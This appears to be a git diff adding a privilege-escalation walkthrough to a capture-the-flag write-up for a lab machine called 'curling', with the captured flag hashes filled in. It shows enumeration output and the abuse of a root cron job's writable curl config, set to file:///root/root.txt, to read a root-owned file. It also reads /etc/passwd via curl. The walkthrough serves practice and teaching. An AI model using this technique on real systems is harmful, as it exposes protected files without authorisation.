@@ -433,9 +433,167 @@ Last login: Wed Sep  8 11:42:07 2021 from 10.10.14.15
 floris@curling:~$ cat user.txt
 65dd1df0713b40d88ead98cf11b8530b
 ```
+### pivot
+
+starting with linpeas as usual:
+```
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-4034
+
+╔══════════╣ Container related tools present
+/usr/bin/lxc
+
+╔══════════╣ Cleaned processes
+...
+root      4523  0.0  0.1  57508  3316 ?        S    20:01   0:00  _ /usr/sbin/CRON -f
+root      4526  0.0  0.0   4636   832 ?        Ss   20:01   0:00  |   _ /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+```
+
+interesting CVE-2021-4034, since this machine was from 2018.. it may work, but let's see if we can find the 'right' path
+
+lxc present, so containers in play
+
+what is `admin-area/input`?
+
+do we need mysql? we've got the password -- only user in the table appears to be `floris`, so nothing new there
+
+```
+floris@curling:~$ cd admin-area/
+floris@curling:~/admin-area$ ls -la
+total 16
+drwxr-x--- 2 root   floris 4096 May 22  2018 .
+drwxr-xr-x 7 floris floris 4096 Jul  8 20:47 ..
+-rw-rw---- 1 root   floris   25 Jul  8 20:47 input
+-rw-rw---- 1 root   floris   94 Jul  8 20:47 report
+floris@curling:~/admin-area$ file input
+input: ASCII text
+floris@curling:~/admin-area$ cat input
+url = "http://127.0.0.1"
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+
+```
+
+hmm..
+
+```
+floris@curling:~/admin-area$ curl file:///etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+floris:x:1000:1004:floris:/home/floris:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+```
+
+so.. can we just change that url?
+
+we can:
+```
+floris@curling:~/admin-area$ vim input
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+floris@curling:~/admin-area$ cat input
+url = "file:///root/root.txt"
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+floris@curling:~/admin-area$ ps aux | grep curl
+root      4491  0.0  0.0   4636   780 ?        Ss   19:59   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4493  0.0  0.4 105880  8840 ?        S    19:59   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4510  0.0  0.0   4636   816 ?        Ss   20:00   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4512  0.0  0.4 105880  8944 ?        S    20:00   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4526  0.0  0.0   4636   832 ?        Ss   20:01   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4527  0.0  0.4 105880  9116 ?        S    20:01   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4560  0.0  0.0   4636   768 ?        Ss   20:04   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4562  0.0  0.4 105880  8984 ?        S    20:04   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+floris   29719  0.0  0.0  13144  1100 pts/0    R+   20:49   0:00 grep --color=auto curl
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+floris@curling:~/admin-area$ ls -l report
+-rw-rw---- 1 root floris 94 Jul  8 20:49 report
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+floris@curling:~/admin-area$ cat report
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+floris@curling:~/admin-area$ ps aux | grep curl
+root      4491  0.0  0.0   4636   780 ?        Ss   19:59   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4493  0.0  0.4 105880  8840 ?        S    19:59   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4510  0.0  0.0   4636   816 ?        Ss   20:00   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4512  0.0  0.4 105880  8944 ?        S    20:00   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4526  0.0  0.0   4636   832 ?        Ss   20:01   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4527  0.0  0.4 105880  9116 ?        S    20:01   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4560  0.0  0.0   4636   768 ?        Ss   20:04   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+root      4562  0.0  0.4 105880  8984 ?        S    20:04   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+floris   29729  0.0  0.0  13144  1044 pts/0    R+   20:49   0:00 grep --color=auto curl
+floris@curling:~/admin-area$ cat report
+82c198ab6fc5365fdc6da2ee5c26064a
+```
 
 ## flag
 ```
-user:
-root:
+user:65dd1df0713b40d88ead98cf11b8530b
+root:82c198ab6fc5365fdc6da2ee5c26064a
 ```
